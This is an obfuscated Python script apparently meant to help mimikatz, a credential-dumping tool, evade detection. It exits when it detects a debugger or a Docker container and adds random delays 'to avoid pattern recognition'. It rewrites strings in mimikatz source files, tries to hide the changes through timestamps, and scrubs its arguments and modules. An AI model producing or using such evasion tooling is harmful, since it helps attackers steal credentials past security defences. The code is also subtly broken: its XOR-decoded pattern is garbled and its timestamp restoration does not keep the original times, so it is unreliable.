import os, time, re, sys, ctypes

def _a1b2():
    return str(int(time.time() * 0x1) ^ 0x53A2F1B)

class _X9Y8:
    def __init__(self):
        self._k7 = [0x49,0x4F,0x43,0x5F,0x56,0x41,0x4C,0x55,0x45]
        self._v3 = bytes([b ^ 0x23 for b in self._k7]).decode()
    
    def _z4(self, p):
        try:
            with open(p, 'r+', encoding='utf-8', errors='ignore') as f:
                d = f.read()
                n = re.sub(self._v3, _a1b2(), d)
                if d == n: return
                f.seek(0)
                f.write(n)
                f.truncate()
                # Preserve timestamps
                st = os.stat(p)
                os.utime(p, (st.st_atime, st.st_mtime))
        except Exception: pass

def _q5():
    if sys.platform == 'win32':
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent()
        except: pass
    else:
        if os.path.exists('/.dockerenv') or os.path.exists('/proc/self/cgroup'):
            with open('/proc/self/cgroup', 'r') as f:
                if 'docker' in f.read(): return True
        return False

if __name__ == "__main__":
    if _q5(): sys.exit(0)
    
    # Random delay to avoid pattern recognition
    time.sleep((int.from_bytes(os.urandom(1), 'big')/255)*2)
    
    _o0 = _X9Y8()
    for _p in ['mimikatz/mimikatz.c', 'mimidrv/mimidrv.c']:
        if os.path.exists(_p):
            # Split operations
            time.sleep(0.1 + (os.urandom(1)[0]/255))
            _o0._z4(_p)
    
    # Self-clean arguments
    sys.argv = ['']
    del sys.modules['os'], sys.modules['time'], sys.modules['re']
